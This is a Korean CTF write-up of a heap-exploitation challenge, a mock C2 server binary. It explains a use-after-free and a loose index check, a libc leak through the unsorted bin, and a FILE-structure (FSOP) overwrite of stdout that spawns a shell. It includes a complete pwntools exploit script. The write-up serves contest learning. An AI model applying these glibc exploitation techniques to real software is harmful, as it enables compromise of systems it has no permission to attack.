+++
title = "WhiteHat Contest 2025 Quals - sleeping C&C"
date = "2025-11-02"
description = "WhiteHat Contest 2025 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "uaf", "improper check", "logical bug", "fsop", "unsorted bin"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/sleeping_cnc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

### Concept
``` bash
=================================
   C2 SERVER v1.0 - INITIALIZED
=================================

[*] Command & Control Server
[*] Managing botnet operations...


===== C2 CONTROL PANEL =====
1. Register new bot
2. Update bot info
3. Send command to bots
4. Deploy task
5. Abort running task
6. Shutdown C2 server
>>
```

C2 서버의 동작을 구현해놓은 문제이다.

### Structure
``` c
struct __fixed bot
{
    char *ip;       // pointing 0x18 chunk
    char *info;     // pointing 0x500 chunk
    int status;
};
```

`bot`은 위와 같이 구성되며 `malloc()`으로 생성 시 0x20 크기의 chunk를 할당받는다.


## 0x01. Vulnerability
### Use After Free
``` c
int deploy_task_1CE0()
{
  __int64 v0; // rax
  pthread_t v2; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( task_running_40C8 )
  {
    puts("[!] A task is already running");
  }
  else if ( bot_count_40CC <= 0 )
  {
    puts("[!] Need at least 1 bots to deploy task");
  }
  else
  {
    task_running_40C8 = 1;
    if ( pthread_create(&v2, 0LL, start_routine, 0LL) )
      err("Failed to create task thread");
    puts("[+] Task deployed");
    return v3 - __readfsqword(0x28u);
  }
  return v0;
}
```

명령을 전달하는 컨셉의 `deploy_task_1CE0()`에서 전역 변수 `task_running_40C8`의 값이 0인지 체크하고 맞으면 1로 바꾼 뒤 쓰레드를 생성한다.
이 값을 다시 0으로 바꾸는 것은 mutex로 관리되기 때문에 `deploy_task_1CE0()`는 abort task를 하기 전에 다시 호출할 수 없다.
 
``` c
void *__fastcall start_routine(void *a1)
{
  unsigned int last; // ebx

  pthread_mutex_lock(&mutex);
  last = bot_count_40CC - 1;
  puts("\n[!] OP : Starting operation...");
  __printf_chk(2LL, "[!] Bot %s (info : %s) has dominated\n", bot_list_40E0[last]->ip, bot_list_40E0[last]->info);
  puts("[*] Attempting reconnection...");
  free_vuln_1B80(last);
  pthread_cond_wait(&cond, &mutex);
  puts("\n[*] Task completed. Bot terminated.");
  --bot_count_40CC;
  task_running_40C8 = 0;
  pthread_mutex_unlock(&mutex);
  return 0LL;
}
```

쓰레드 내부에서는 마지막 `bot`의 정보를 출력해주고 취약한 `free_vuln_1B80()`을 호출해준다.

처음에는 abort task를 하기 전에 `bot_count_40CC`가 감소하지 않으므로 이를 이용해서 race condition 비슷한 걸 해야하나 싶었는데, 후술할 다른 취약점 덕분에 필요가 없어졌다.

``` c
void __fastcall free_vuln_1B80(int index)
{
  struct bot *bot; // rbx

  bot = bot_list_40E0[index];
  if ( bot )
  {
    *bot->ip = 0;
    *bot->info = 0;
    free(bot->ip);
    free(bot->info);
    free(bot);
  }
}
```

최종적으로 `free_vuln_1B80()`에서는 `bot`, `bot->ip`와 `bot->info`를 해제하지만 포인터 값을 초기화하지는 않기 때문에 dangling pointer로 남게 된다.
이 포인터를 다른 취약점과 연계해서 UAF로 활용할 수 있다.

### Improper Check
``` c
int update_bot_18D0()
{
  int v0; // eax
  struct bot *bot_selected; // r12
  int v2; // eax
  unsigned int tmp; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-20h]

  v5 = __readfsqword(0x28u);
  __printf_chk(2LL, "[?] Bot index to update: ");
  tmp = 0;
  __isoc99_scanf(" %d", &tmp);
  do
    v0 = getc(stdin);
  while ( v0 != 10 && v0 != -1 );
  if ( tmp > 4 )                                    // vulnerable!!!
    return puts("[!] Invalid bot index");
  bot_selected = bot_list_40E0[tmp];
  if ( !bot_selected )
    return puts("[!] Bot not found at this index");
  __printf_chk(2LL, "[+] New ip_address: ");
  my_read_1740(bot_selected->ip, 0x18);
  __printf_chk(2LL, "[+] New info: ");
  my_read_1740(bot_selected->info, 0x500);
  __printf_chk(2LL, "[+] New status: ");
  tmp = 0;
  __isoc99_scanf(" %d", &tmp);
  do
    v2 = getc(stdin);
  while ( v2 != -1 && v2 != 10 );
  bot_selected->status = tmp;
  return puts("[+] Bot information updated");
}
```

`update_bot_18D0()`에서 업데이트할 `bot`을 고르기 위해 `index`를 입력받는다.
이 때 `bot`의 개수를 저장하는 `bot_count_40CC`와 비교해야 하는데, 최댓값인 4보다 큰지를 확인한다.
따라서 포인터가 유효한 주소를 가리키기만 한다면 해제된 `bot`에 접근이 가능하다.


## 0x02. Exploit
### Libc Leak
어쨌던간에 아무런 주소값도 없고 출력부가 쓰레드 함수인 `start_routine()`에만 있기 때문에 `bot->ip`나 `bot->info`를 통해 leak을 해야겠다는 생각이 들었다.

이 중 `bot->info`는 0x500짜리 큰 크기의 chunk이기 때문에 해제되면 unsorted bin으로 가게 된다.
메모리를 보면 다음과 같이 libc의 `main_arena` 중간 주소를 저장하고 있다.

``` bash
# before free
gef➤  x/3gx 0x00005555555592a0
0x5555555592a0: 0x00005555555592d0      0x00005555555592f0
0x5555555592b0: 0x0000000000000001

# after free
gef➤  x/4gx 0x00005555555592f0
0x5555555592f0: 0x00007ffff7facb20      0x00007ffff7facb20
0x555555559300: 0x0000000000000000      0x0000000000000000
```

이 chunk는 해제된 뒤 값이 초기화되지 않고 다음 `bot->info` 할당 때 다시 반환된다.
출력부에서 `%s` 포맷 스트링으로 `info`를 출력해주니까 `\x00`을 잘 채워서 `info`를 입력해주면 libc leak이 가능하다.

``` python
    deploy_task(s)
    abort_task(s)

    register_new_bot(s, b"AAAAAAAA", b"aaaaaaaa", b"1")
    r = deploy_task(s)
    libc = u64(r.split(b"aaaaaaaa")[1][:6] + b"\x00\x00") - main_arena_offset
    lib.address = libc
    stdout = libc + stdout_offset
    buf = libc + buf_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"stdout : {hex(stdout)}")
    log.info(f"buf : {hex(buf)}")
    abort_task(s)
```

### Use After Free
이제 UAF를 위해 dangling pointer를 남겨두어야 한다.
사실 `bot` 생성 후 해제하기만 하면 바로 dangling pointer를 만들 수 있다.

``` python
    register_new_bot(s, b"BBBBBBBB", b"bbbbbbbb", b"1")
    deploy_task(s)
    abort_task(s)
```

위 코드를 실행 후 메모리와 fastbin을 확인하면 다음과 같다.

``` bash
gef➤  x/5gx 0x0000555555554000 + 0x40e0
0x5555555580e0: 0x00005555555592a0      0x0000000000000000
0x5555555580f0: 0x0000000000000000      0x0000000000000000
0x555555558100: 0x0000000000000000
gef➤  heap bins
─────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
All tcachebins are empty
───────────────────────────────── Fastbins for arena at 0x7ffff7e1ac80 ─────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x5555555592d0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5555555592a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

첫 번째 `bot`이 `0x5555555592a0`에 할당되었다가 해제되었으며, 그로 인해 크기가 0x30인 fastbin에 chunk가 들어가 있다.

``` c
int send_command_1A70()
{
  int v0; // eax
  void *cmd; // rbx
  int v3; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  puts("[*] Operating Command :");
  puts("  1. Quick command ");
  puts("  2. General command ");
  __printf_chk(2LL, ">> ");
  v3 = 0;
  __isoc99_scanf(" %d", &v3);
  if ( v3 == 1 )
  {
    cmd = malloc(0x20uLL);
    puts("[+] Write Quick command payload :");
  }
  else
  {
    cmd = malloc(0x100uLL);
    puts("[+] Write command payload :");
  }
  my_read_1740(cmd);
  return puts("[+] Command queued for deployment");
}
```

마침 `send_command_1A70()`에서 0x20짜리 chunk를 할당받기 때문에 0x30 fastbin에서 chunk를 받아오고, 내용도 쓸 수 있다.
따라서 `send_command_1A70()`를 통해 `bot->ip`나 `bot->info`가 가리키는 주소값을 변조한 뒤 `update_bot_18D0()`으로 AAW를 만들 수 있다.

이제 AAW를 이용해 어떻게 RIP control을 할지 고민해야하는데, libc leak 말고 다른 leak이 없고 0x500이라는 큰 크기의 내용을 쓸 수 있으므로 FSOP를 이용하기로 했다.

### FSOP
먼저 앞서 언급한대로 `send_command_1A70()`를 이용해 `bot` 구조체의 내용을 변조한다.

``` python
    payload = p64(buf)                # bot->ip
    payload += p64(stdout)            # bot->info
    payload += p64(1)                 # bot->status
    send_command(s, b"1", payload)
```

`buf`는 exploit에서 필요하지 않으므로 libc 영역 중 무의미한 아무 영역의 주소를 넣었다. `bot->info`가 `stdout`을 가리키고 있으므로 `bot->info`를 update할 때 `stdout`의 내용을 변조할 수 있다.

`stdout`의 마지막 필드인 `vtable` 포인터까지 덮을 수 있으므로(0xe0 이상) 다음 FSOP payload를 사용할 수 있다.

``` python
    stdout_lock = lib.sym.__nptl_last_event - 0x48
    payload = FSOP_struct(
        flags=u64(b"\x01\x01\x01\x01;sh\x00"),
        lock=stdout_lock,
        _wide_data=lib.sym['_IO_2_1_stdout_'] - 0x10,
        _markers=lib.symbols["system"],
        _unused2=p32(0x0) + p64(0x0) + p64(lib.sym['_IO_2_1_stdout_'] - 0x8),
        vtable=lib.symbols["_IO_wfile_jumps"] - 0x20,
        _mode=0xFFFFFFFF,
    )
    update_bot(s, b"0", b"CCCCCCCC", payload)
```

이후 `puts`나 `printf`를 만나면 `_IO_wfile_overflow`가 호출되며 쉘을 실행시킬 수 있다.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "prob"
LIBRARY = "libc.so.6"
CONTAINER = "9d734f3d11b8"
code_base = 0x555555554000
bp = {
    'main' : code_base + 0x12BA,
}

gs = f'''
!b *{bp["main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']
context.log_level = "DEBUG"

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def register_new_bot(s, ip, info, status):
    s.sendline(b"1")
    s.sendafter(b"address: ", ip)
    s.sendafter(b"info: ", info)
    s.sendlineafter(b"online): ", status)
    return s.recvuntil(b">> ")

def update_bot(s, index, ip, info):
    s.sendline(b"2")
    s.sendlineafter(b"update: ", index)
    s.sendafter(b"address: ", ip)
    s.sendafter(b"info: ", info)
    return

def send_command(s, mode, cmd):
    s.sendline(b"3")
    s.sendlineafter(b">> ", mode)
    s.sendlineafter(b"payload :\n", cmd)
    return s.recvuntil(b">> ")

def deploy_task(s):
    s.sendline(b"4")
    sleep(0.5)
    return s.recvuntil(b"reconnection...\n")

def abort_task(s):
    s.sendline(b"5")
    sleep(0.5)
    return s.recvuntil(b"terminated.\n")

def shutdown(s):
    s.sendline(b"6")
    return s.recvuntil(b"server...\n")

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
        main_arena_offset = 0x203b20
        stdout_offset = 0x2045c0
        buf_offset = 0x204700
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
        main_arena_offset = 0x21ace0
        stdout_offset = 0x2045c0
        buf_offset = 0x204700
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    
    s.recvuntil(">> ")
    
    # send big chunk to unsorted bin
    deploy_task(s)
    abort_task(s)

    # leak libc
    register_new_bot(s, b"AAAAAAAA", b"aaaaaaaa", b"1")
    r = deploy_task(s)
    libc = u64(r.split(b"aaaaaaaa")[1][:6] + b"\x00\x00") - main_arena_offset
    lib.address = libc
    stdout = libc + stdout_offset
    buf = libc + buf_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"stdout : {hex(stdout)}")
    log.info(f"buf : {hex(buf)}")
    abort_task(s)

    # leave a dangling pointer
    register_new_bot(s, b"BBBBBBBB", b"bbbbbbbb", b"1")
    deploy_task(s)
    abort_task(s)

    # manipulate bot structure
    payload = p64(buf)
    payload += p64(stdout)
    payload += p64(1)
    send_command(s, b"1", payload)

    # send FSOP payload via UAF
    stdout_lock = lib.sym.__nptl_last_event - 0x48
    payload = FSOP_struct(
        flags=u64(b"\x01\x01\x01\x01;sh\x00"),
        lock=stdout_lock,
        _wide_data=lib.sym['_IO_2_1_stdout_'] - 0x10,
        _markers=lib.symbols["system"],
        _unused2=p32(0x0) + p64(0x0) + p64(lib.sym['_IO_2_1_stdout_'] - 0x8),
        vtable=lib.symbols["_IO_wfile_jumps"] - 0x20,
        _mode=0xFFFFFFFF,
    )
    update_bot(s, b"0", b"CCCCCCCC", payload)

    s.interactive()
    print(shutdown(s))

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```

## 0x04. Reference
- [FSOP (glibc 2.35, 2.39)](https://h4ck.kr/?p=3742)